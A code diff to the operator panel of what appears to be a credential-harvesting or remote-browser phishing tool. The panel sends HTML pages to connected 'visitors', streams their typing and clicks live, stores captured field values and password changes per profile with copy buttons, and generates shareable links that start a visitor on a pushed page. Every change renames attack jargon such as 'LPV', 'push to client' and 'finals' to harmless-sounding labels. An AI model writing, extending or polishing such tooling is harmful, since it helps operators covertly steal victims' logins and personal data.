@@ -63,7 +63,7 @@
                 <iframe id="pcm-preview-iframe" src="about:blank" style="width:100%; height:68vh; border:0; display:block; background:#fff;"></iframe>
             </div>
             <div class="pcm-modal-footer">
-                <button id="pcm-preview-open-lpv" class="pcm-modal-btn secondary" type="button">Open in LPV Archive</button>
+                <button id="pcm-preview-open-lpv" class="pcm-modal-btn secondary" type="button">Open in page archive</button>
                 <button id="pcm-preview-close2" class="pcm-modal-btn primary" type="button">Done</button>
             </div>
         </div>
@@ -7226,7 +7226,7 @@
                 </button>
                 <button class="top-tab" data-tab="lpv">
                     <svg viewBox="0 0 24 24"><path d="M9 2v6h6V2h-6zm8 0v6h5V2h-5zM2 2v6h6V2H2zm7 8v6h6v-6H9zm8 0v6h5v-6h-5zM2 10v6h6v-6H2zm7 8v4h6v-4H9zm8 0v4h5v-4h-5zM2 18v4h6v-4H2z"/></svg>
-                    <span>LPV</span>
+                    <span>Live pages</span>
                 </button>
                 <button class="top-tab" data-tab="tgbot">
                     <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/></svg>
@@ -7998,17 +7998,17 @@
                         <label class="settings-row" style="display:flex; align-items:flex-start; gap:10px; padding:8px 0; cursor:pointer;">
                             <input type="checkbox" id="settings-lpv-only" style="margin-top:3px;" />
                             <div>
-                                <div style="font-weight:500;">LPV-only mode (boot users into LPV automatically)</div>
+                                <div style="font-weight:500;">Live pages only — new visitors start on a live page</div>
                                 <div style="color:var(--text-muted); font-size:11px; margin-top:3px;">
-                                    When ON, new clients connect straight into LPV mode — no browser is spawned, no
-                                    DOM is captured, no SingleFile runs. The client only sees pages the admin pushes.
-                                    When OFF, clients get a full browser session (legacy behavior).
+                                    When ON, new visitors go straight to a live page — no browser is opened and no
+                                    page content is captured. The visitor only sees pages you send them.
+                                    When OFF, visitors get a full remote browser session.
                                 </div>
                             </div>
                         </label>
 
                         <div class="settings-row" style="display:flex; align-items:center; gap:10px; padding:8px 0;">
-                            <div style="min-width:140px; color:var(--text-muted); font-size:12px;">Default LPV landing page</div>
+                            <div style="min-width:140px; color:var(--text-muted); font-size:12px;">Default page for new visitors</div>
                             <input type="text" id="settings-lpv-default-page" class="lpv-input" style="flex:1;" />
                         </div>
                         <div style="color:var(--text-muted); font-size:11px; margin-left:150px; margin-top:-4px;">
@@ -8207,9 +8207,9 @@
                 <div class="lpv-header">
                     <div class="lpv-title">
                         <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor"><path d="M9 2v6h6V2H9zm8 0v6h5V2h-5zM2 2v6h6V2H2zm7 8v6h6v-6H9zm8 0v6h5v-6h-5zM2 10v6h6v-6H2zm7 8v4h6v-4H9zm8 0v4h5v-4h-5zM2 18v4h6v-4H2z"/></svg>
-                        <span>LPV — Live Panel Version</span>
+                        <span>Live pages</span>
                     </div>
-                    <div class="lpv-sub">Push HTML pages to a client. Watch fields and clicks in real time. Everything is recorded in the audit log.</div>
+                    <div class="lpv-sub">Send pages to a visitor and watch what they type and click, in real time. Everything is recorded in the activity log.</div>
                 </div>
 
                 <div class="lpv-controls">
@@ -8226,8 +8226,8 @@
                     <div class="lpv-control-row">
                         <label class="lpv-label">Mode</label>
                         <div class="lpv-button-row">
-                            <button class="lpv-btn primary" id="lpv-start-btn">Start LPV</button>
-                            <button class="lpv-btn" id="lpv-stop-btn">Stop LPV</button>
+                            <button class="lpv-btn primary" id="lpv-start-btn">Start live session</button>
+                            <button class="lpv-btn" id="lpv-stop-btn">End live session</button>
                         </div>
                     </div>
                 </div>
@@ -8328,7 +8328,7 @@
                                 <span id="lpv-auto-wf-status" style="font-size: 11px; color: var(--text-muted);"></span>
                             </div>
                             <div style="font-size: 11px; color: var(--text-muted); margin-top: 6px;">
-                                Active only in <b>LPV-only mode</b>.  Fires on every connect (reconnects replay).
+                                Active only in <b>Live pages only</b>.  Fires on every connect (reconnects replay).
                             </div>
                         </div>
 
@@ -8343,7 +8343,7 @@
                 <!-- REDACTION sub-pane -->
                 <div class="lpv-subpane" id="lpv-sub-profiles">
                     <div class="lpv-panel">
-                        <div class="lpv-panel-title">LPV profiles</div>
+                        <div class="lpv-panel-title">Visitor history</div>
                         <div class="lpv-sub" style="margin: -6px 0 10px 0;">
                             One card per client_id with audit history. Click a card to see the full event log.
                             Logs are scoped to the page name they happened on.
@@ -8391,7 +8391,7 @@
                         <input type="text" class="section-search-bar" id="lpv-profiles-search" placeholder="Search clients…" style="margin-bottom: 10px;">
 
                         <div id="lpv-profiles-list" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 10px;">
-                            <div class="lpv-empty" id="lpv-profiles-empty">No LPV profiles yet</div>
+                            <div class="lpv-empty" id="lpv-profiles-empty">No visitor history yet</div>
                         </div>
                     </div>
                 </div>
@@ -10011,10 +10011,10 @@
                     window.handleLPVAck(message);
                 }
             } else if (message.type === 'lpv_error') {
-                showToast('LPV error: ' + (message.error || 'unknown'), 'error');
+                showToast('Live page error: ' + (message.error || 'unknown'), 'error');
             } else if (message.type === 'lpv_selected') {
                 const st = document.getElementById('screenshot-status');
-                if (st) st.textContent = 'LPV client · no browser screencast';
+                if (st) st.textContent = 'Live page visitor · no screen view';
                 try { document.querySelector('.screenshot-panel')?.classList.remove('cdp-mode'); } catch(e){}
             } else if (message.type === 'clients') {
                 const currentClientIds = new Set(message.clients ? message.clients.map(c => c.client_id) : []);
@@ -10691,10 +10691,10 @@
                 card.onclick = () => selectClient(c.client_id);
                 card.innerHTML = `
                     <div class="client-header">
-                        <span class="client-id">${(c.client_id || '').slice(-12)}${isLpv ? ' · LPV' : ''}</span>
+                        <span class="client-id">${(c.client_id || '').slice(-12)}${isLpv ? ' · live page' : ''}</span>
                         <span class="client-status ${isSleeping ? 'sleeping' : ''}"></span>
                     </div>
-                    <div class="client-info">${isLpv ? ('LPV' + (workflowLabel ? ' · ' + workflowLabel : '') + parentLabel) : (c.current_url || c.url || 'about:blank')}</div>
+                    <div class="client-info">${isLpv ? ('Live page' + (workflowLabel ? ' · ' + workflowLabel : '') + parentLabel) : (c.current_url || c.url || 'about:blank')}</div>
                     <div class="client-meta">
                         <span class="client-meta-item">
                             <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg>
@@ -10766,11 +10766,11 @@
                 streamOverlayEl.classList.remove('visible');
                 try {
                     document.querySelector('.screenshot-panel')?.classList.remove('cdp-mode');
-                    document.getElementById('screenshot-status').textContent = 'LPV client · no browser screencast';
+                    document.getElementById('screenshot-status').textContent = 'Live page visitor · no screen view';
                 } catch(e) {}
                 ws.send(JSON.stringify({ type: 'subscribe', client_id: clientId }));
                 ws.send(JSON.stringify({ type: 'get_info', client_id: clientId }));
-                updateTimelineStatus(`LPV client ${clientId.slice(-8)} selected`);
+                updateTimelineStatus(`Live page visitor ${clientId.slice(-8)} selected`);
                 renderTimeline();
                 return;
             }
@@ -13145,14 +13145,14 @@
                     </div>
                     <div class="profile-info">
                         <div class="profile-header">
-                            <span class="profile-id">${session.client_id.slice(-12)}${isLpv ? ' · LPV' : ''}</span>
+                            <span class="profile-id">${session.client_id.slice(-12)}${isLpv ? ' · live page' : ''}</span>
                             <span class="profile-status ${isOnline ? 'online' : 'offline'}">
                                 <span class="profile-status-dot"></span>
                                 ${isOnline ? 'Online' : 'Offline'}
                             </span>
                         </div>
                         <div class="profile-url">
-                            <span class="profile-url-text">${isLpv ? 'LPV' + (workflowLabel ? ' · ' + escapeHtml(workflowLabel) : '') + (session.parent_client_id && session.parent_client_id !== session.client_id ? ' · parent ' + escapeHtml(session.parent_client_id.slice(-8)) : '') : displayUrl}</span>
+                            <span class="profile-url-text">${isLpv ? 'Live page' + (workflowLabel ? ' · ' + escapeHtml(workflowLabel) : '') + (session.parent_client_id && session.parent_client_id !== session.client_id ? ' · parent ' + escapeHtml(session.parent_client_id.slice(-8)) : '') : displayUrl}</span>
                         </div>
                         <div class="profile-meta">
                             <span class="profile-meta-item">
@@ -14332,7 +14332,40 @@
                 return d.toLocaleTimeString();
             }
 
-            function lpvFormatBytes(n) {
+            /* Event names arrive from the server in snake_case. Show operators plain
+   English instead of the wire format. Falls back to a title-cased phrase
+   for anything we have not mapped yet. */
+const LPV_EVENT_LABELS = {
+    field_final:     'Detail captured',
+    field_change:    'Typing',
+    input:           'Typing',
+    page_load:       'Page viewed',
+    page_loaded:     'Page viewed',
+    page_pushed:     'Page sent',
+    page_final:      'Page finished',
+    submit:          'Form submitted',
+    click:           'Clicked',
+    push:            'Page sent',
+    load:            'Page viewed',
+    redirect:        'Sent to another page',
+    password_change: 'Password changed',
+    workflow_start:  'Flow started',
+    workflow_done:   'Flow finished',
+    workflow_step:   'Flow step',
+    lpv_started:     'Live session started',
+    lpv_stopped:     'Live session ended',
+    lpv_push:        'Page sent',
+    chat:            'Message sent',
+};
+function lpvEventLabel(t){
+    if(!t) return '';
+    const label = LPV_EVENT_LABELS[t] || String(t)
+        .replace(/_/g, ' ')
+        .replace(/([a-z])([A-Z])/g, '$1 $2')
+        .replace(/\b\w/g, c => c.toUpperCase());
+    return escapeHtml(label);
+}
+function lpvFormatBytes(n) {
                 if (!n) return '0 B';
                 if (n < 1024) return n + ' B';
                 if (n < 1024 * 1024) return (n / 1024).toFixed(1) + ' KB';
@@ -14657,7 +14690,7 @@
                 if (!lpvSendWS({ type: 'lpv_start', client_id: cid })) return;
                 LPV_STATE.lpvClients.add(cid);
                 lpvUpdateSessionPill();
-                showToast('LPV start → ' + cid.slice(-8), 'info');
+                showToast('Live session started → ' + cid.slice(-8), 'info');
             }
 
             function lpvStop() {
@@ -14666,14 +14699,14 @@
                 if (!lpvSendWS({ type: 'lpv_stop', client_id: cid })) return;
                 LPV_STATE.lpvClients.delete(cid);
                 lpvUpdateSessionPill();
-                showToast('LPV stop → ' + cid.slice(-8), 'info');
+                showToast('Live session ended → ' + cid.slice(-8), 'info');
             }
 
             function lpvPushPage(pageId) {
                 const cid = LPV_STATE.selectedClient;
                 if (!cid) { showToast('Select a client first', 'error'); return; }
                 if (!LPV_STATE.lpvClients.has(cid)) {
-                    showToast('Start LPV for this client first', 'warning');
+                    showToast('Start a live session for this visitor first', 'warning');
                     return;
                 }
                 if (!lpvSendWS({ type: 'lpv_push_page', client_id: cid, page_id: pageId })) return;
@@ -14840,7 +14873,7 @@
                     body = ''
                         + '<div class="wf-head">'
                         +   '<span class="t">' + t + '</span>'
-                        +   '<span style="display:inline-block; padding:1px 6px; border-radius:3px; font-size:10px; background:rgba(255,255,255,0.05); border:1px solid ' + badgeColor + '; color:' + badgeColor + ';">' + escapeHtml(e.event_type) + '</span>'
+                        +   '<span style="display:inline-block; padding:1px 6px; border-radius:3px; font-size:10px; background:rgba(255,255,255,0.05); border:1px solid ' + badgeColor + '; color:' + badgeColor + ';">' + lpvEventLabel(e.event_type) + '</span>'
                         +   ' <span class="wf-kind" style="background:' + kindBg + '; border-color:' + badgeColor + '; color:' + badgeColor + ';">' + escapeHtml(ftype) + '</span>'
                         +   ' <span class="wf-page">' + escapeHtml(label) + '</span>'
                         +   ' <span class="wf-step-counter">' + escapeHtml(pageLabel) + '</span>'
@@ -14887,7 +14920,7 @@
                     body = ''
                         + '<div class="wf-head">'
                         +   '<span class="t">' + t + '</span>'
-                        +   '<span style="display:inline-block; padding:1px 6px; border-radius:3px; font-size:10px; background:rgba(255,255,255,0.05); border:1px solid #4ade80; color:#4ade80;">' + escapeHtml(e.event_type) + '</span>'
+                        +   '<span style="display:inline-block; padding:1px 6px; border-radius:3px; font-size:10px; background:rgba(255,255,255,0.05); border:1px solid #4ade80; color:#4ade80;">' + lpvEventLabel(e.event_type) + '</span>'
                         +   ' <span class="wf-page">' + escapeHtml(pageLabel) + '</span>'
                         + '</div>'
                         + '<div class="wf-bar"><div class="wf-pip done"></div><div class="wf-pip current"></div></div>';
@@ -14905,7 +14938,7 @@
                     body = ''
                         + '<div class="wf-head">'
                         +   '<span class="t">' + t + '</span>'
-                        +   '<span style="display:inline-block; padding:1px 6px; border-radius:3px; font-size:10px; background:rgba(255,255,255,0.05); border:1px solid #888; color:#888;">' + escapeHtml(e.event_type) + '</span>'
+                        +   '<span style="display:inline-block; padding:1px 6px; border-radius:3px; font-size:10px; background:rgba(255,255,255,0.05); border:1px solid #888; color:#888;">' + lpvEventLabel(e.event_type) + '</span>'
                         + '</div>'
                         + '<div class="wf-bar"><div class="wf-pip done"></div><div class="wf-pip current"></div></div>';
                     return '<div class="lpv-event workflow_step" style="padding:8px 10px; border-radius:10px; background:rgba(180,142,255,0.06); border:1px solid rgba(180,142,255,0.18);">' + body + '</div>';
@@ -14979,7 +15012,7 @@
                     body = ''
                         + '<div class="wf-head">'
                         +   '<span class="t">' + t + '</span>'
-                        +   '<span style="display:inline-block; padding:1px 6px; border-radius:3px; font-size:10px; background:rgba(255,255,255,0.05); border:1px solid var(--text-muted); color:var(--text-muted);">' + escapeHtml(e.event_type) + '</span>'
+                        +   '<span style="display:inline-block; padding:1px 6px; border-radius:3px; font-size:10px; background:rgba(255,255,255,0.05); border:1px solid var(--text-muted); color:var(--text-muted);">' + lpvEventLabel(e.event_type) + '</span>'
                         + '</div>'
                         + '<div class="wf-bar"><div class="wf-pip done"></div><div class="wf-pip current"></div></div>'
                         + lpvPayloadBlocks(p);
@@ -15029,9 +15062,9 @@
                 } else if (evt.event_type === 'page_load_failed') {
                     notify('Page load failed', evt.payload && evt.payload.error || 'unknown', 'error', 4000);
                 } else if (evt.event_type === 'lpv_started') {
-                    notify('LPV started', cid.slice(-8), 'info', 2500);
+                    notify('Live session started', cid.slice(-8), 'info', 2500);
                 } else if (evt.event_type === 'lpv_stopped') {
-                    notify('LPV stopped', cid.slice(-8), 'info', 2500);
+                    notify('Live session ended', cid.slice(-8), 'info', 2500);
                 } else if (evt.event_type === 'workflow_started') {
                     notify('Workflow started', evt.payload && evt.payload.name || 'workflow', 'info', 2500);
                 } else if (evt.event_type === 'workflow_finished') {
@@ -15186,7 +15219,7 @@
                     '    <button class="lpv-btn" data-action="versions">Version history</button>' +
                     '    <button class="lpv-btn" data-action="rename">Rename</button>' +
                     '    <button class="lpv-btn" data-action="duplicate">Duplicate</button>' +
-                    '    <button class="lpv-btn primary" data-action="push">Push to client</button>' +
+                    '    <button class="lpv-btn primary" data-action="push">Send to visitor</button>' +
                     '  </div>' +
                     '</div>';
                 host.appendChild(overlay);
@@ -15360,7 +15393,7 @@
                     '  <div class="meta"><div class="name">' + escapeHtml(p.name) + ' (v' + p.version + ')</div>' +
                     '    <div class="sub">' + lpvFormatBytes(p.size_bytes) + ' · ' + escapeHtml((p.tags || []).join(', ')) + '</div></div>' +
                     '  <button class="lpv-btn" data-bind="' + p.id + '" style="margin-right:6px;">Bindings' + (((p.bindings || []).length) ? ' · ' + (p.bindings || []).length : '') + '</button>' +
-                    '  <button class="lpv-btn primary" data-push="' + p.id + '">Push</button>' +
+                    '  <button class="lpv-btn primary" data-push="' + p.id + '">Send</button>' +
                     '</div>'
                 ).join('');
                 list.querySelectorAll('[data-push]').forEach(b => {
@@ -15421,8 +15454,8 @@
                     const status = document.getElementById('lpv-auto-wf-status');
                     if (status) {
                         status.textContent = lpvOnly
-                            ? '✓ LPV-only mode is ON — auto-workflow will fire on new connects'
-                            : '⚠ LPV-only mode is OFF — auto-workflow is dormant';
+                            ? '✓ Live pages only is ON — this flow runs for every new visitor'
+                            : '⚠ Live pages only is OFF — this flow will not run';
                         status.style.color = lpvOnly ? 'var(--success)' : 'var(--warning)';
                     }
                 } catch (e) {
@@ -15556,7 +15589,7 @@
                     '</div>' +
                     '<div id="lpv-wf-link-row" style="margin-top:10px; display:flex; gap:8px; align-items:center; flex-wrap:wrap; padding:8px 10px; border:1px dashed rgba(180,142,255,0.25); border-radius:10px; background:rgba(180,142,255,0.06);">' +
                     '  <span style="font-size:11px; color:var(--text-muted); font-weight:600; font-family:Montserrat, sans-serif; display:inline-flex; align-items:center; gap:6px;"><svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg> workflow link</span>' +
-                    '  <span style="font-size:10px; color:var(--text-muted);">persistent shareable — boots client into LPV & auto-starts this workflow</span>' +
+                    '  <span style="font-size:10px; color:var(--text-muted);">persistent shareable — starts the visitor on a live page and runs this flow</span>' +
                     '  <div style="flex:1;"></div>' +
                     '  <button class="lpv-btn" id="lpv-wf-gen-link" title="Generate workflow link">Generate Link</button>' +
                     '  <input id="lpv-wf-link-out" class="lpv-input" placeholder="click Generate Link" readonly style="min-width:220px; flex:1; font-size:11px;" />' +
@@ -15991,7 +16024,7 @@
 
             function _eventPill(type) {
                 const map = {
-                    field_final:        { c: 'var(--success)',   l: 'final' },
+                    field_final:        { c: 'var(--success)',   l: 'captured' },
                     field_change:       { c: '#4aa3ff',         l: 'change' },
                     password_change:    { c: 'var(--danger)',    l: 'password' },
                     click:              { c: '#b48eff',         l: 'click' },
@@ -16137,7 +16170,7 @@
 
                 if (!filtered.length) {
                     list.innerHTML = '<div class="lpv-empty">' +
-                        (q ? 'No clients match "' + _esc(q) + '"' : 'No LPV profiles yet') + '</div>';
+                        (q ? 'No visitors match "' + _esc(q) + '"' : 'No visitor history yet') + '</div>';
                     return;
                 }
 
@@ -16148,7 +16181,7 @@
                         ? '<span title="Active" style="display:inline-block; width:8px; height:8px; border-radius:50%; background:#4ade80; box-shadow:0 0 6px #4ade80; margin-right:6px;"></span>'
                         : '<span title="Inactive" style="display:inline-block; width:8px; height:8px; border-radius:50%; background:#555; margin-right:6px;"></span>';
                     const finalsBadge = (p.field_final_count||0) > 0
-                        ? '<span style="display:inline-flex; align-items:center; gap:4px; font-size:10px; padding:3px 8px; border-radius:999px; background:rgba(74,222,128,0.12); border:1px solid rgba(74,222,128,0.35); color:#4ade80;"><svg viewBox="0 0 24 24" width="11" height="11" fill="currentColor" style="vertical-align:-1px; margin-right:3px;"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg> ' + p.field_final_count + ' finals</span>'
+                        ? '<span style="display:inline-flex; align-items:center; gap:4px; font-size:10px; padding:3px 8px; border-radius:999px; background:rgba(74,222,128,0.12); border:1px solid rgba(74,222,128,0.35); color:#4ade80;"><svg viewBox="0 0 24 24" width="11" height="11" fill="currentColor" style="vertical-align:-1px; margin-right:3px;"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg> ' + p.field_final_count + ' details captured</span>'
                         : '';
                     return '' +
                         '<div class="lpv-profile-card" data-client-id="' + _esc(p.client_id) + '" ' +
@@ -16234,7 +16267,7 @@
                     const pages = new Set(LPV_PROFILES.modal.events.map(e => e.page_id||'_none')).size;
                     metaEl.textContent = LPV_PROFILES.modal.events.length + ' events • ' + finals + ' finals • ' + pages + ' pages';
                     if (statsEl) {
-                        statsEl.innerHTML = '<span><svg viewBox="0 0 24 24" width="11" height="11" fill="currentColor" style="vertical-align:-1px; margin-right:3px; opacity:0.9;"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8l-1.41-1.41L14 2zm2 14H8v-2h8v2zm0-4H8v-2h8v2zm-2-7V3.5L19 8.5H12z"/></svg> ' + pages + ' pages</span><span><svg viewBox="0 0 24 24" width="11" height="11" fill="currentColor" style="vertical-align:-1px; margin-right:3px;"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg> ' + finals + ' finals on blur/submit/nav</span><span><svg viewBox="0 0 24 24" width="11" height="11" fill="currentColor" style="vertical-align:-1px; margin-right:3px;"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg> click any value to copy</span>';
+                        statsEl.innerHTML = '<span><svg viewBox="0 0 24 24" width="11" height="11" fill="currentColor" style="vertical-align:-1px; margin-right:3px; opacity:0.9;"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8l-1.41-1.41L14 2zm2 14H8v-2h8v2zm0-4H8v-2h8v2zm-2-7V3.5L19 8.5H12z"/></svg> ' + pages + ' pages</span><span><svg viewBox="0 0 24 24" width="11" height="11" fill="currentColor" style="vertical-align:-1px; margin-right:3px;"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg> ' + finals + ' details captured on blur, submit and navigation</span><span><svg viewBox="0 0 24 24" width="11" height="11" fill="currentColor" style="vertical-align:-1px; margin-right:3px;"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg> click any value to copy</span>';
                     }
                     // populate page selector
                     (function(){
@@ -16409,7 +16442,7 @@
                 }
 
                 if (!all.length) {
-                    logsEl.innerHTML = '<div class="klg-empty-state" style="padding:28px;"><div class="klg-empty-icon" style="width:56px; height:56px; margin:0 auto 12px;"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div><div class="klg-empty-title" style="font-size:14px; font-family: Montserrat, sans-serif;">No events yet</div><div class="klg-empty-text" style="font-family: Montserrat, sans-serif;">Interactions will appear here as the client browses. Final values are captured on blur, submit & navigation.</div></div>';
+                    logsEl.innerHTML = '<div class="klg-empty-state" style="padding:28px;"><div class="klg-empty-icon" style="width:56px; height:56px; margin:0 auto 12px;"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div><div class="klg-empty-title" style="font-size:14px; font-family: Montserrat, sans-serif;">No events yet</div><div class="klg-empty-text" style="font-family: Montserrat, sans-serif;">Activity appears here as the visitor browses. Details are captured when they leave a field, submit, or move on.</div></div>';
                     return;
                 }
 
@@ -16449,7 +16482,7 @@
                         return '<div class="lpv-event workflow_step" style="padding:8px 10px; border-radius:10px; background:rgba(180,142,255,0.06); border:1px solid rgba(180,142,255,0.18);">' +
                                 '<div class="wf-head">' +
                                     '<span class="t">' + safeDate + ' ' + safeTime + '</span>' +
-                                    '<span style="display:inline-block; padding:1px 6px; border-radius:3px; font-size:10px; background:rgba(255,255,255,0.05); border:1px solid #4ade80; color:#4ade80;">final</span>' +
+                                    '<span style="display:inline-block; padding:1px 6px; border-radius:3px; font-size:10px; background:rgba(255,255,255,0.05); border:1px solid #4ade80; color:#4ade80;">captured</span>' +
                                     ' <span class="wf-kind" style="background:rgba(74,222,128,0.14); border-color:#4ade80; color:#4ade80;">' + _esc(fieldType) + '</span>' +
                                     ' <span class="wf-page">' + safeField + '</span>' +
                                     ' <span class="wf-step-counter">' + safePage + '</span>' +
@@ -16550,13 +16583,13 @@
                         const typePill = fieldType ? '<span class="wf-kind" style="background:rgba(74,222,128,0.14); border-color:#4ade80; color:#4ade80;">' + _esc(fieldType) + '</span>' : '';
                         const reasonPill = reason ? '<span style="font-size:9px; padding:2px 6px; border-radius:999px; background:rgba(255,255,255,0.06); border:1px solid rgba(255,255,255,0.08); color:var(--text-muted);">' + _esc(reason) + '</span>' : '';
                         const copyBtn = hasValue
-                            ? '<button class="lpv-card__copy" data-copy-value="' + idx + '" title="Copy this final value" style="flex-shrink:0; padding:4px 8px; border-radius:6px; border:1px solid var(--border); background:var(--bg-card); color:var(--text-secondary); font-size:10px; cursor:pointer; font-family:Montserrat, sans-serif;"><svg viewBox="0 0 24 24" width="10" height="10" fill="currentColor"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg> copy</button>'
+                            ? '<button class="lpv-card__copy" data-copy-value="' + idx + '" title="Copy this captured value" style="flex-shrink:0; padding:4px 8px; border-radius:6px; border:1px solid var(--border); background:var(--bg-card); color:var(--text-secondary); font-size:10px; cursor:pointer; font-family:Montserrat, sans-serif;"><svg viewBox="0 0 24 24" width="10" height="10" fill="currentColor"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg> copy</button>'
                             : '';
                         return pageHeader +
                             '<div class="lpv-event workflow_step" style="padding:8px 10px; border-radius:10px; background:rgba(180,142,255,0.06); border:1px solid rgba(180,142,255,0.18);">' +
                                 '<div class="wf-head">' +
                                     '<span class="t">' + timeStr + '</span>' +
-                                    '<span style="display:inline-block; padding:1px 6px; border-radius:3px; font-size:10px; background:rgba(255,255,255,0.05); border:1px solid #4ade80; color:#4ade80;">final</span>' +
+                                    '<span style="display:inline-block; padding:1px 6px; border-radius:3px; font-size:10px; background:rgba(255,255,255,0.05); border:1px solid #4ade80; color:#4ade80;">captured</span>' +
                                     ' ' + typePill + reasonPill +
                                     ' <span class="wf-page">' + _esc(fieldLabel) + '</span>' +
                                 '</div>' +
@@ -16575,7 +16608,7 @@
                     if (isChange) { badgeLabel = ev.event_type==='password_change' ? 'password' : 'change'; badgeColor='#4aa3ff'; kindColor='#4aa3ff'; kindBg='rgba(74,163,255,0.14)'; }
                     else if (ev.event_type==='click') { badgeLabel='click'; badgeColor='#b48eff'; kindColor='#b48eff'; kindBg='rgba(180,142,255,0.14)'; }
                     else if (ev.event_type==='form_submit') { badgeLabel='submit'; badgeColor='#fbbf24'; kindColor='#fbbf24'; kindBg='rgba(251,191,36,0.14)'; }
-                    else if (ev.event_type==='field_final') { badgeLabel='final'; badgeColor='#4ade80'; kindColor='#4ade80'; kindBg='rgba(74,222,128,0.14)'; }
+                    else if (ev.event_type==='field_final') { badgeLabel='captured'; badgeColor='#4ade80'; kindColor='#4ade80'; kindBg='rgba(74,222,128,0.14)'; }
                     const valuePreview = hasValue ? _esc(valueStr.length>90 ? valueStr.slice(0,90)+'…' : valueStr) : '';
                     const fullValEsc = _esc(valueStr);
                     const copyInline = hasValue
